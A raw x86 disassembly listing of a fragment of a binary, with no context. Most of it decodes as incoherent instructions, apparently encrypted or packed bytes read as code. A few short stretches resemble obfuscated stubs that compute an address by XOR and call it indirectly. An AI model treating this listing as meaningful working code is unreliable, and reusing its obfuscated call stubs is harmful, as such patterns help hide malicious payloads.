  415f42:	in     al,0x6a
  415f44:	jb     0x415ed1
  415f46:	aas    
  415f47:	xchg   ebx,eax
  415f48:	mov    dl,0xfb
  415f4a:	sbb    eax,0xfb7a0eac
  415f4f:	les    ebx,FWORD PTR [esi-0x64]
  415f52:	out    0xd4,al
  415f54:	out    0x51,al
  415f56:	and    BYTE PTR [esi+0x3c80d74b],al
  415f5c:	loope  0x415f4b
  415f5e:	not    edx
  415f60:	or     bl,BYTE PTR [ecx+edx*4]
  415f63:	mov    ebx,0xfef71cf8
  415f68:	mov    ss,edi
  415f6a:	mov    bh,0x1c
  415f6c:	out    dx,al
  415f6d:	mov    cl,0x5b
  415f6f:	mov    al,BYTE PTR [ebx]
  415f71:	test   BYTE PTR [eax],cl
  415f73:	push   ds
  415f74:	xchg   esp,eax
  415f75:	pop    edx
  415f76:	push   0xffffffc1
  415f78:	stos   BYTE PTR es:[edi],al
  415f79:	lds    edi,FWORD PTR [ebx+0x325f3379]
  415f7f:	adc    al,0xd6
  415f81:	add    al,0xd9
  415f84:	jmp    0x4f41:0x3535c9a5
  415f8b:	fnstenv [eax]
  415f8d:	xor    DWORD PTR [edx-0x59],ecx
  415f90:	jbe    0x415ff2
  415f92:	cmp    dh,BYTE PTR [ecx+0x56]
  415f95:	stos   DWORD PTR es:[edi],eax
  415f96:	ret    
  415f97:	lahf   
  415f98:	cmp    BYTE PTR [ecx+0xa038769],bl
  415f9e:	ds cld 
  415fa0:	jl     0x416002
  415fa2:	out    0x9e,eax
  415fa4:	push   edx
  415fa5:	fnsave [edx-0xb]
  415fa8:	daa    
  415fa9:	or     bl,BYTE PTR [edx]
  415fab:	sbb    ah,BYTE PTR [eax+0x33]
  415fae:	(bad)  [eax+eiz*1-0x3b]
  415fb2:	adc    al,BYTE PTR [ebx-0x7198989c]
  415fb8:	cwde   
  415fb9:	mov    eax,0xd66b2395
  415fbe:	lods   al,BYTE PTR ds:[esi]
  415fbf:	mov    eax,ds:0xb0356644
  415fc4:	mov    ebx,0x8eb42dc0
  415fc9:	mov    DWORD PTR ds:0xd8f30ec1,edi
  415fcf:	sbb    BYTE PTR [edi+0x61],dl
  415fd2:	int    0x7b
  415fd4:	fisub  DWORD PTR [edi]
  415fd6:	and    eax,0x96be9695
  415fdb:	mov    esp,0x7211c794
  415fe0:	ret    0x9b9
  415fe3:	sbb    al,0xe9
  415fe5:	push   0xe646628a
  415fea:	les    edi,FWORD PTR [ecx]
  415fec:	scas   al,BYTE PTR es:[edi]
  415fed:	sub    BYTE PTR [eax-0x27e7731e],bh
  415ff3:	xchg   ecx,eax
  415ff4:	pop    es
  415ff5:	mov    ds:0x515478e0,al
  415ffa:	sbb    bl,cl
  415ffc:	sub    cl,BYTE PTR [esp+eiz*4+0x76]
  416000:	fidiv  DWORD PTR [edx-0x1d372084]
  416006:	jmp    0x416021
  416008:	cs inc ecx
  41600a:	ja     0x416051
  41600c:	aas    
  41600d:	sbb    al,BYTE PTR [eax-0x7a]
  416010:	mov    esp,0x68fc6ed3
  416015:	cmp    eax,0x949eecbc
  41601a:	sub    ebp,eax
  41601c:	inc    ebp
  41601d:	lea    ebp,[edi-0x6d287251]
  416023:	into   
  416024:	push   esp
  416025:	and    DWORD PTR [esi+esi*4+0x78],esi
  416029:	frstor [ecx-0x3ae7aa32]
  41602f:	xchg   DWORD PTR [eax],ecx
  416031:	arpl   WORD PTR [edx],si
  416033:	push   ebx
  416034:	adc    esp,DWORD PTR [esi+0x45]
  416037:	dec    esi
  416038:	xchg   edi,eax
  416039:	pop    es
  41603a:	and    al,al
  41603c:	jg     0x415ff7
  41603e:	adc    al,0x89
  416040:	ret    
  416041:	pop    ss
  416042:	pop    ebp
  416043:	inc    ebp
  416044:	shr    ebx,1
  416046:	cmp    eax,0xee351e9d
  41604b:	push   ebx
  41604c:	mulps  xmm4,XMMWORD PTR [edi+0x2e]
  416050:	(bad)  
  416051:	jns    0x416048
  416053:	xlat   BYTE PTR ds:[ebx]
  416054:	push   esi
  416055:	or     BYTE PTR [ecx+0x4fd460b3],0x5
  41605c:	push   ebp
  41605d:	and    ah,BYTE PTR [ecx+0x6960cb62]
  416063:	mov    esp,0x8b362ea4
  416068:	push   ebp
  416069:	or     BYTE PTR [ebx],dh
  41606b:	ror    DWORD PTR [ebp+0x729c1084],0x32
  416072:	add    BYTE PTR [ecx+0x458b0845],cl
  416078:	call   0x3355b608
  41607d:	rol    DWORD PTR [ebx],0xc6
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x41601f
  41609a:	dec    eax
  41609b:	mov    ebp,0x7f17cae6
  4160a0:	jo     0x41605b
  4160a2:	jle    0x416114
  4160a4:	jo     0x416037
  4160a6:	xchg   edi,eax
  4160a7:	jle    0x41605e
  4160a9:	stos   BYTE PTR es:[edi],al
  4160aa:	imul   ebx,DWORD PTR [ebx],0x43
  4160ad:	push   cs
  4160ae:	gs push ds
  4160b0:	sti    
  4160b1:	lods   al,BYTE PTR ds:[esi]
  4160b2:	gs leave 
  4160b4:	repz or bl,dl
  4160b7:	lea    edx,[edx-0x6]
  4160ba:	gs pop edi
  4160bc:	aaa    
  4160bd:	(bad)
  4160c0:	cmp    al,0xe4
  4160c2:	shr    BYTE PTR [ebp-0x47],0x30
  4160c6:	cmp    al,0xc2
  4160c8:	fld    TBYTE PTR [esi+0x66a2ef82]
  4160ce:	pop    edx
  4160cf:	test   eax,0x674db5f5
  4160d4:	and    DWORD PTR [ecx],edx
  4160d6:	test   BYTE PTR [edx-0x49],dh
  4160d9:	push   ecx
  4160da:	stc    
  4160db:	das    
  4160dc:	in     al,dx
  4160dd:	std    
  4160de:	xchg   edx,eax
  4160df:	dec    ebp
  4160e0:	pop    es
  4160e1:	sub    DWORD PTR [ebx-0x41ace4cd],ebp
  4160e7:	aas    
  4160e8:	jp     0x4160f0
  4160ea:	out    dx,eax
  4160eb:	in     eax,0x91
  4160ed:	sub    DWORD PTR [edx],ecx
  4160ef:	enter  0xb471,0x53
  4160f3:	xor    edi,DWORD PTR [edi]
  4160f5:	mov    ebx,0xd4814f46
  4160fa:	(bad)  [edx-0x15]
  4160fd:	stos   BYTE PTR es:[edi],al
  4160fe:	pop    ecx
  4160ff:	push   esi
  416100:	or     edi,esp
  416102:	or     BYTE PTR ds:0x4707b247,al
  416108:	or     BYTE PTR gs:[edx+0x3],ch
  41610c:	sti    
  41610d:	imul   esi,DWORD PTR [edi-0x7ba314b3],0xffffffef
  416114:	inc    ebx
  416115:	cmc    
  416116:	sbb    BYTE PTR [eax+0x4b9a3be4],dh
  41611c:	es inc eax
  41611e:	mov    WORD PTR [edx+0x1d4a55e9],ss
  416124:	xor    al,0x7c
  416126:	inc    edi
  416127:	sub    ecx,DWORD PTR [edi]
  416129:	or     DWORD PTR [edx-0x60],esi
  41612c:	push   esp
  41612d:	push   eax
  41612e:	adc    BYTE PTR [edi],dl
  416130:	fld    TBYTE PTR [ebx+edx*1]
  416133:	out    0x3a,eax
  416135:	or     ah,BYTE PTR [edx-0x9]
  416138:	mov    fs,WORD PTR [ecx]
  41613a:	es xchg al,ch
  41613d:	dec    esp
  41613e:	and    BYTE PTR ds:[edx],bl
  416141:	dec    esp
  416142:	or     al,0xca
  416145:	sub    BYTE PTR [ebx],0xaa
  416148:	ins    DWORD PTR es:[edi],dx
  416149:	fdiv   DWORD PTR [ebx]
  41614b:	adc    eax,0x1db1f166
  416150:	dec    ebp
  416151:	(bad)  
  416152:	int3   
  416153:	xchg   esi,eax
  416154:	xchg   edi,eax
  416155:	add    al,0xe9
  416157:	sub    dl,BYTE PTR [edi-0x58]
  41615a:	xchg   ecx,eax
  41615b:	rcr    BYTE PTR [edi-0x65],cl
  41615e:	ror    DWORD PTR [edi-0x6db81ed9],0x38
  416165:	(bad)  
  416166:	shr    BYTE PTR [esp+ecx*4-0x391911df],0xc6
  41616e:	stos   BYTE PTR es:[edi],al
  41616f:	mov    DWORD PTR [ebx-0x28],ecx
  416172:	xchg   ecx,eax
  416173:	dec    eax
  416174:	jle    0x4160f7
  416176:	std    
  416177:	popf   
  416178:	inc    esi
  416179:	xchg   BYTE PTR [edi+0x37],dl
  41617c:	int3   
  41617d:	jecxz  0x416100
  41617f:	or     bl,bh
  416181:	and    DWORD PTR [edi],ecx
  416183:	data16 std 
  416185:	mov    BYTE PTR [eax+0x5c9de544],cl
  41618b:	sbb    bh,dl
  41618d:	xor    esp,ecx
  41618f:	jp     0x416175
  416191:	mov    ebx,ecx
  416193:	mov    bl,0xe3
  416195:	stos   DWORD PTR es:[edi],eax
  416196:	(bad)  
  416197:	int    0x52
  416199:	mov    al,ds:0x5f40f107
  41619e:	dec    esp
  41619f:	add    DWORD PTR [ebx],eax
  4161a1:	xchg   DWORD PTR [ecx+0x27d18712],esp
  4161a7:	cmp    edi,DWORD PTR [edi]
  4161a9:	sub    BYTE PTR [esi-0x2791caf6],0x14
  4161b0:	pop    edx
  4161b1:	int3   
  4161b2:	dec    esi
  4161b3:	add    DWORD PTR [eax+esi*2+0x1a863af2],esp
  4161ba:	jns    0x4161aa
  4161bc:	jl     0x416148
  4161be:	push   0x77
  4161c0:	cdq    
  4161c1:	in     al,0xcc
  4161c3:	ror    BYTE PTR [eax+edx*1+0x7dff831d],cl
  4161ca:	inc    ebp
  4161cb:	mov    BYTE PTR [eax-0x42],al
  4161ce:	add    eax,0x85465bda
  4161d3:	lds    ebp,FWORD PTR [eax-0x47]
  4161d6:	repnz mov esp,0x370dde5a
  4161dc:	sub    al,BYTE PTR [ebp+0x74]
  4161df:	jns    0x416250
  4161e1:	sub    al,0xa8
  4161e3:	shrd   DWORD PTR [ebx],ebp,cl
  4161e6:	sub    al,BYTE PTR [edi-0x73]
  4161e9:	cwde   
  4161ea:	retf   
  4161eb:	sysret 
  4161ed:	mov    esi,0x838b0fdd
  4161f2:	popa   
  4161f3:	jne    0x416223
  4161f5:	add    DWORD PTR [esi+0x12],edx
  4161f8:	xor    dh,cl
  4161fa:	push   esi
  4161fb:	jp     0x416248
  4161fd:	push   esp
  4161fe:	sbb    ecx,DWORD PTR [ebx+edi*4-0x28b8fa48]
  416205:	add    dh,BYTE PTR ds:0x5f610c5a
  41620b:	popf   
  41620c:	sub    dh,ah
  41620e:	push   ebp
  41620f:	or     BYTE PTR [esi+0x659cba64],bl
  416215:	pop    ecx
  416216:	mov    BYTE PTR [edx+0x5b],ah
  416219:	push   esi
  41621a:	jp     0x416266
  41621c:	ret    0x9c83
  41621f:	(bad)  
  416220:	sti    
  416221:	in     al,dx
  416222:	into   
  416223:	data16 out 0x70,al
  416226:	lds    edx,FWORD PTR [ebx+0x49369fe6]
  41622c:	cmc    
  41622d:	mov    bl,0xa9
  41622f:	rcr    BYTE PTR [edx-0x608c99a7],cl
  416235:	mov    ebx,0x7c09bb7
  41623a:	cld    
  41623b:	adc    dl,al
  41623d:	sbb    dh,dh
  41623f:	leave  
  416240:	sar    BYTE PTR [ecx+0x14],1
  416243:	pop    esp
  416244:	loop   0x4162a5
  416246:	leave  
  416247:	test   al,0x8d
  416249:	mov    eax,DWORD PTR [edi+ebp*4+0x15facf79]
  416250:	mov    dh,0x39
  416252:	and    cl,BYTE PTR [ecx]
  416254:	pop    ecx
  416255:	lock es repnz sbb eax,0xefced323
  41625d:	bt     DWORD PTR [ebx],ebp
  416260:	pop    esi
  416261:	push   cs
  416262:	jg     0x416260
  416264:	mov    dh,0xb8
  416266:	dec    eax
  416267:	call   0xdcbe:0x8ac1c64
  41626e:	inc    ebx
  41626f:	js     0x4162ac
  416271:	inc    esi
  416272:	fs mov al,0xfd
  416275:	sahf   
  416276:	arpl   sp,di
  416278:	int3   
  416279:	sub    dh,BYTE PTR [esi+eiz*4-0x5ebb538a]
  416280:	mov    esi,0x1368c3a
  416285:	das    
  416286:	mov    DWORD PTR [ecx],esp
  416288:	jb     0x41626d
  41628a:	scas   al,BYTE PTR es:[edi]
  41628b:	or     al,0x99
  41628d:	div    DWORD PTR [edi+0x4c671315]
  416293:	pop    eax
  416294:	pop    ebp
  416295:	mov    eax,ds:0x4ca49070
  41629a:	mov    edi,0x43b59db5
  41629f:	out    0x28,al
  4162a1:	mov    dh,0xe6
  4162a3:	inc    eax
  4162a4:	ds in  eax,0xf8
  4162a7:	lods   eax,DWORD PTR ds:[esi]
  4162a8:	inc    BYTE PTR [eax+0x4bee6cad]
  4162ae:	shl    BYTE PTR [ebx+0x56],cl
  4162b1:	(bad)  
  4162b2:	ficomp WORD PTR [ebx]
  4162b4:	ins    BYTE PTR es:[edi],dx
  4162b5:	jge    0x41625f
  4162b7:	lock mov al,ds:0x8246c11
  4162bd:	sub    BYTE PTR [eax+0x66],ch
  4162c0:	int3   
  4162c1:	push   edi
  4162c2:	int3   
  4162c3:	xchg   edx,eax
  4162c4:	fimul  WORD PTR [ebx]
  4162c6:	sbb    bl,BYTE PTR [ebp+0x41fb3e8a]
  4162cc:	ins    BYTE PTR es:[edi],dx
  4162cd:	xchg   DWORD PTR [ecx+eiz*1-0xda2aeac],eax
  4162d4:	stc    
  4162d5:	(bad)  
  4162d6:	jmp    0xb827e50f
  4162db:	fmul   st,st(5)
  4162dd:	fsub   QWORD PTR [edx]
  4162df:	test   BYTE PTR [esi+edi*2+0x39355110],dl
  4162e6:	mov    dh,0xa1
  4162e8:	aam    0xec
  4162ea:	ds pop ebp
  4162ec:	dec    edi
  4162ed:	scas   al,BYTE PTR es:[edi]
  4162ee:	pop    ebp
  4162ef:	into   
  4162f0:	lahf   
  4162f1:	inc    edi
  4162f2:	stc    
  4162f3:	mov    ebp,0x33f8e75f
  4162f8:	test   DWORD PTR [ebx+0x6e],ecx
  4162fb:	fcomp  QWORD PTR [edx+eax*8]
  4162fe:	add    ebx,DWORD PTR [ecx]
  416300:	or     esp,eax
  416302:	mov    dh,0x16
  416304:	cmp    bh,BYTE PTR [ecx]
  416306:	mov    esi,DWORD PTR [ecx-0x7e]
  416309:	xchg   edi,eax
  41630a:	jg     0x4162fa
  41630c:	push   esi
  41630d:	fcmovne st,st(0)
  41630f:	or     BYTE PTR [esi-0x2b],0xf4
  416313:	lods   al,BYTE PTR ds:[esi]
  416314:	jg     0x416352
  416316:	inc    edi
  416317:	pusha  
  416318:	fwait
  416319:	daa    
  41631a:	jmp    FWORD PTR [edx]
  41631c:	jg     0x416388
  41631e:	(bad)  
  41631f:	jnp    0x4162bf
  416321:	mov    ah,0xc0
  416323:	jae    0x416361
  416325:	pop    eax
  416326:	add    al,0x20
  416328:	push   0xee5bcff1
  41632d:	imul   ebp,DWORD PTR [ecx-0x13],0x22be0d79
  416334:	iret   
  416335:	sti    
  416336:	ja     0x4162d3
  416338:	push   es
  416339:	adc    DWORD PTR [ecx],ebx
  41633b:	sub    BYTE PTR [edx+0x1a],bl
  41633e:	comiss xmm0,xmm6
  416341:	mov    dh,0x2a
  416343:	cmp    ebx,DWORD PTR ds:0x8e44f1a6
  416349:	xor    al,BYTE PTR [ecx]
  41634b:	loopne 0x41631f
  41634d:	jbe    0x416300
  41634f:	shl    ah,cl
  416351:	cli    
  416352:	rcl    BYTE PTR [ebp-0x6e90ba3e],cl
  416358:	or     ah,al
  41635a:	dec    ebx
  41635b:	popf   
  41635c:	push   cs
  41635d:	addr16 inc esp
  41635f:	mov    eax,ds:0x20f4173b
  416364:	enter  0xab0e,0x2f
  416368:	cmovbe ebx,DWORD PTR [ebp+eax*1-0x72f7b275]
  416370:	mov    WORD PTR [edx],cs
  416372:	pushf  
  416373:	jb     0x4163a7
  416375:	add    BYTE PTR [ebx],bh
  416377:	enter  0x850f,0x22
  41637b:	icebp  
  41637c:	(bad)  
  41637d:	dec    DWORD PTR [ebx+0x5e9de]
  416383:	add    BYTE PTR [eax],al
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0x3646c841
  4163bf:	sub    al,0x97
  4163c1:	adc    edx,DWORD PTR [edi+edi*2]
  4163c4:	jo     0x41637f
  4163c6:	jle    0x416438
  4163c8:	jo     0x4163e6
  4163ca:	push   ebp
  4163cb:	call   0xca3adc11
  4163d0:	adc    DWORD PTR ds:0x5f6376ec,ecx
  4163d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163d7:	add    eax,0xe25037b5
  4163dc:	adc    DWORD PTR ds:0x881c968c,esi
  4163e2:	pop    esi
  4163e3:	sub    DWORD PTR [esi],ebx
  4163e5:	or     BYTE PTR [eax+0x7e],al
  4163e8:	loop   0x41639c
  4163ea:	scas   al,BYTE PTR es:[edi]
  4163eb:	sub    al,0x94
  4163ed:	cmp    BYTE PTR [ebx+0x7af3c4f8],0x7d
  4163f4:	rol    BYTE PTR [ecx],cl
  4163f6:	dec    ebx
  4163f7:	dec    eax
  4163f8:	inc    esp
  4163f9:	enter  0xcc8a,0xbc
  4163fd:	lods   al,BYTE PTR ds:[esi]
  4163fe:	mov    dh,0x1f
  416400:	ret    0x2ee
  416403:	inc    edi
  416404:	rcl    cl,1
  416406:	or     ebp,DWORD PTR [esi-0x2c]
  416409:	mov    al,ds:0x8ac9be85
  41640e:	pusha  
  41640f:	test   BYTE PTR [edi-0x3f5d4e90],ah
  416415:	inc    esi
  416416:	mov    eax,ds:0xd3f0ed78
  41641b:	push   esi
  41641c:	iret   
  41641d:	xor    eax,DWORD PTR [edi+0x7ed0c90c]
  416423:	xchg   edi,eax
  416424:	push   0xc59c8411
  416429:	and    eax,0x190d3a9
  41642e:	mov    eax,0x5ad8429
  416433:	aas    
  416434:	sub    ch,BYTE PTR [esi+0x23]
  416437:	retf   
  416438:	mov    ebx,0xc26c2a1b
  41643d:	mov    ecx,ecx
  41643f:	ds imul ebp
  416442:	push   cs
  416443:	fs jle 0x416443
  416446:	xor    al,0xc3
  416448:	jb     0x4163f6
  41644a:	pop    ecx
  41644b:	loope  0x416454
  41644d:	and    bl,BYTE PTR [edx+eiz*2+0x42]
  416451:	jnp    0x4163fe
  416453:	add    DWORD PTR [eax],eax
  416455:	adc    edx,ebx
  416457:	adc    DWORD PTR [edi-0x41],eax
  41645a:	inc    ebp
  41645b:	and    DWORD PTR [eax],esp
  41645d:	pop    ds
  41645e:	sub    BYTE PTR [edx-0x43490505],0x75
  416465:	push   ebx
  416466:	dec    ebp
  416467:	pop    edi
  416468:	mov    ecx,0x99e82bf8
  41646d:	mov    bh,0xbf
  41646f:	mov    bh,0xb2
  416471:	cmp    esp,DWORD PTR [edx]
  416473:	mov    al,ds:0x9b96a57c
  416478:	repnz pop ss
  41647a:	repnz (bad) 
  41647c:	pop    esp
  41647d:	icebp  
  41647e:	je     0x41645f
  416480:	dec    eax
  416481:	pushf  
  416482:	fwait
  416483:	fwait
  416484:	add    ch,BYTE PTR [edi]
  416486:	push   0x62
  416488:	mov    ah,0x74
  41648a:	repnz shr al,1
  41648d:	int3   
  41648e:	daa    
  41648f:	je     0x4164c1
  416491:	add    esi,DWORD PTR [edx+esi*8-0x11]
  416495:	mov    edx,0xc2d5565f
  41649a:	stos   DWORD PTR es:[edi],eax
  41649b:	push   ss
  41649c:	push   ds
  41649d:	dec    ecx
  41649e:	adc    eax,0xab3edfdd
  4164a3:	nop
  4164a4:	pop    esp
  4164a5:	sbb    edi,DWORD PTR [edx+ebx*2-0x28]
  4164a9:	push   0xffffffcc
  4164ab:	and    BYTE PTR [esi],dl
  4164ad:	sbb    BYTE PTR [ebx],0x82
  4164b0:	lock dec ebx
  4164b2:	(bad)  
  4164b3:	sub    DWORD PTR [ebx],0xc6005d40
  4164b9:	shl    DWORD PTR [ecx-0x474f4915],0x96
  4164c0:	add    al,0x7d
  4164c2:	mov    DWORD PTR [ebp+0x26],ebx
  4164c5:	repz shl BYTE PTR [ebx+ebp*4-0x30999a36],cl
  4164cd:	cwde   
  4164ce:	pop    ebx
  4164cf:	call   0xbfa0:0x754fff3e
  4164d6:	jae    0x416463
  4164d8:	data16 loop 0x4164e4
  4164db:	jbe    0x416497
  4164dd:	out    dx,al
  4164de:	dec    edx
  4164df:	or     al,0xa3
  4164e1:	push   edx
  4164e2:	mov    eax,0xc72feb06
  4164e7:	outs   dx,BYTE PTR ds:[esi]
  4164e8:	mov    bh,0xf2
  4164ea:	scas   eax,DWORD PTR es:[edi]
  4164eb:	dec    edx
  4164ec:	adc    al,0xca
  4164ee:	stos   BYTE PTR es:[edi],al
  4164ef:	add    BYTE PTR [eax-0x47],0x39
  4164f3:	icebp  
  4164f4:	add    DWORD PTR [eax-0x31088dbc],0xadd1e503
  4164fe:	sub    al,0x59
  416500:	not    DWORD PTR ds:0xb2d272e7
  416506:	sbb    al,0xba
  416508:	dec    esi
  416509:	jmp    0x2d988e0a
  41650e:	and    eax,0xae6e9d58
  416513:	jmp    0x157f:0x4d731d01
  41651a:	addr16 repz xchg ebp,eax
  41651d:	imul   edi
  41651f:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  416521:	inc    eax
  416522:	pop    ebx
  416523:	jge    0x41651a
  416525:	pop    es
  416526:	inc    esp
  416527:	pop    ss
  416528:	inc    ecx
  416529:	or     eax,0x474891ca
  41652e:	xchg   edi,eax
  41652f:	cmp    esp,DWORD PTR [eax-0x6b]
  416532:	(bad)  
  416533:	inc    ebp
  416534:	in     eax,dx
  416535:	arpl   ax,bx
  416537:	or     al,0x5d
  416539:	or     eax,0x7e8f6f9a
  41653e:	inc    ebx
  41653f:	js     0x416508
  416541:	scas   al,BYTE PTR es:[edi]
  416542:	pop    es
  416543:	icebp  
  416544:	push   eax
  416545:	jp     0x4165ae
  416547:	mov    edi,0xff8dad6b
  41654c:	push   0x17
  41654e:	xor    DWORD PTR [edx-0x133a97d1],esp
  416554:	and    DWORD PTR [edx],0x58738b49
  41655a:	xor    DWORD PTR [edx+0x66],0x4763ff12
  416561:	or     DWORD PTR [ebx-0x6e],ebp
  416564:	pop    es
  416565:	cmp    ch,dl
  416567:	cmp    DWORD PTR [ebx+0x56],0xffffffe0
  41656b:	test   eax,0x7213f604
  416570:	xor    BYTE PTR [eax],bl
  416572:	loope  0x4165eb
  416574:	pushf  
  416575:	retf   0x75eb
  416578:	push   0x52
  41657a:	outs   dx,BYTE PTR ds:[esi]
  41657b:	adc    dl,BYTE PTR [eax-0x55cf5fbe]
  416581:	popf   
  416582:	or     ebp,edi
  416584:	retf   
  416585:	dec    ebx
  416586:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416587:	pop    ds
  416588:	push   esp
  416589:	or     eax,0xc7568bed
  41658e:	ret    
  41658f:	mov    edx,0x335a9e48
  416594:	cmp    al,BYTE PTR [eax-0x31]
  416597:	jge    0x416565
  416599:	(bad)  
  41659b:	push   esp
  41659c:	mov    esi,0xa472bd13
  4165a1:	add    DWORD PTR [eax+0x3d33c8ee],0x26
  4165a8:	inc    edi
  4165a9:	xchg   edx,eax
  4165aa:	loope  0x416588
  4165ac:	sbb    BYTE PTR [eax],0x1c
  4165af:	mov    edi,0xbd53b36
  4165b4:	jle    0x416536
  4165b6:	outs   dx,BYTE PTR ds:[esi]
  4165b7:	jp     0x4165d8
  4165b9:	mov    ebx,0x8cd00595
  4165be:	jb     0x416632
  4165c0:	je     0x41656d
  4165c2:	dec    eax
  4165c3:	fstp   TBYTE PTR [esi-0x64]
  4165c6:	stc    
  4165c7:	leave  
  4165c8:	lods   al,BYTE PTR ds:[esi]
  4165c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165ca:	xor    BYTE PTR [esi+0x60990672],bh
  4165d0:	idiv   BYTE PTR [esi-0x46]
  4165d3:	in     al,0xd8
  4165d5:	test   bl,dl
  4165d7:	push   eax
  4165d8:	leave  
  4165d9:	or     BYTE PTR [ebp+0x2bc78733],dh
  4165df:	and    ebx,DWORD PTR [eax]
  4165e1:	mov    ch,0xc2
  4165e3:	mov    ?,ecx
  4165e5:	add    eax,0xc2c23edf
  4165ea:	lods   al,BYTE PTR ds:[esi]
  4165eb:	ret    
  4165ec:	jo     0x4165b2
  4165ee:	xchg   edi,eax
  4165ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165f0:	fwait
  4165f1:	iretw  
  4165f3:	out    dx,al
  4165f4:	add    dl,bh
  4165f6:	int    0x8f
  4165f8:	retf   
  4165f9:	sbb    al,0x4a
  4165fb:	scas   al,BYTE PTR es:[edi]
  4165fc:	sub    esi,DWORD PTR [esi-0x175df391]
  416602:	repnz adc BYTE PTR [ebx],0x36
  416606:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416607:	xchg   edi,eax
  416608:	mov    dh,0x2b
  41660a:	call   0x5a816daa
  41660f:	out    dx,al
  416610:	bound  eax,QWORD PTR [ebp+0x19]
  416613:	dec    esi
  416614:	ja     0x4165fb
  416616:	shr    BYTE PTR [edx],1
  416618:	xor    edi,DWORD PTR [edx+0x21cbc1cb]
  41661e:	pop    es
  41661f:	inc    ebp
  416620:	test   BYTE PTR [esp+eax*4+0x315ae468],dh
  416627:	je     0x41666c
  416629:	pop    ds
  41662a:	mov    edx,0x42f575d8
  41662f:	mov    DWORD PTR [ecx-0x39],0xb32835ce
  416636:	pop    esi
  416637:	mov    bh,0x47
  416639:	sar    BYTE PTR [esp+esi*2-0x21],cl
  41663d:	fdiv   QWORD PTR [esi-0x52]
  416640:	cmc    
  416641:	repnz rcr DWORD PTR [esi+0x5b],cl
  416645:	loope  0x416644
  416647:	sbb    cl,BYTE PTR ds:0xbb5e6a46
  41664d:	jg     0x41667d
  41664f:	cmp    dl,BYTE PTR [ebx+eax*1]
  416652:	enter  0x2180,0xd6
  416656:	mov    edx,0xf639cd02
  41665b:	or     esp,esi
  41665d:	ficom  WORD PTR [ebx]
  41665f:	sub    cl,BYTE PTR [edi]
  416661:	add    BYTE PTR [esi-0x22d30e6b],cl
  416667:	pop    ds
  416668:	aad    0xeb
  41666a:	cmp    eax,0xa700990c
  41666f:	cmp    eax,0x244f9bf9
  416674:	push   ecx
  416675:	xor    edx,eax
  416677:	and    BYTE PTR [edi],ch
  416679:	stos   DWORD PTR es:[edi],eax
  41667a:	jnp    0x41662c
  41667c:	cmp    al,0xbd
  41667e:	push   ecx
  41667f:	push   es
  416680:	or     BYTE PTR [edx+0x6c],dh
  416683:	aam    0xc2
  416685:	mov    dh,0x22
  416687:	cwde   
  416688:	pop    eax
  416689:	jge    0x4166b8
  41668b:	cmc    
  41668c:	push   esi
  41668d:	mov    eax,DWORD PTR [esi-0x3a]
  416690:	xchg   edx,eax
  416691:	push   0xa
  416693:	pop    ecx
  416694:	push   0x4
  416696:	pop    ebx
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x4166a2
  4166ae:	inc    esi
  4166af:	push   esp
  4166b0:	dec    ecx
  4166b1:	pop    esp
  4166b2:	adc    bh,BYTE PTR [edi+0x70]
  4166b5:	mov    ecx,0x370707e
  4166ba:	cmp    dh,dl
  4166bc:	push   0xffffffec
  4166be:	in     eax,0x61
  4166c0:	mov    esi,0x33be3ff3
  4166c5:	or     BYTE PTR [ebx+ebx*2-0x319d7dba],ah
  4166cc:	inc    ebx
  4166cd:	xor    al,0x82
  4166cf:	cdq    
  4166d0:	outs   dx,BYTE PTR ds:[esi]
  4166d1:	loope  0x416729
  4166d3:	repz into 
  4166d5:	call   0x710d:0x2e44af51
  4166dc:	jecxz  0x41666b
  4166de:	mov    cl,0x42
  4166e0:	fstp   DWORD PTR [ebx]
  4166e2:	sub    edi,DWORD PTR [ebx]
  4166e4:	aas    
  4166e5:	mov    ds,WORD PTR [ebp+0x724f3e69]
  4166eb:	or     al,0xb3
  4166ed:	int3   
  4166ee:	idiv   bh
  4166f0:	pop    edx
  4166f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166f2:	das    
  4166f3:	jo     0x416715
  4166f5:	je     0x4166a4
  4166f7:	cmp    eax,0x2e240ecf
  4166fc:	mov    bl,0x4d
  4166fe:	dec    ebp
  4166ff:	jge    0x416709
  416701:	and    DWORD PTR [eax],ebx
  416703:	pop    ebp
  416704:	xor    dh,BYTE PTR [ebx-0x558b546a]
  41670a:	je     0x416690
  41670c:	(bad)  
  41670d:	jnp    0x4166b5
  41670f:	popf   
  416710:	inc    esp
  416711:	data16 (bad) 
  416713:	fild   WORD PTR [eax-0x7114fd53]
  416719:	out    dx,eax
  41671a:	xor    DWORD PTR [ebx],ecx
  41671c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41671d:	js     0x4166c9
  41671f:	(bad)  
  416720:	sbb    dl,bh
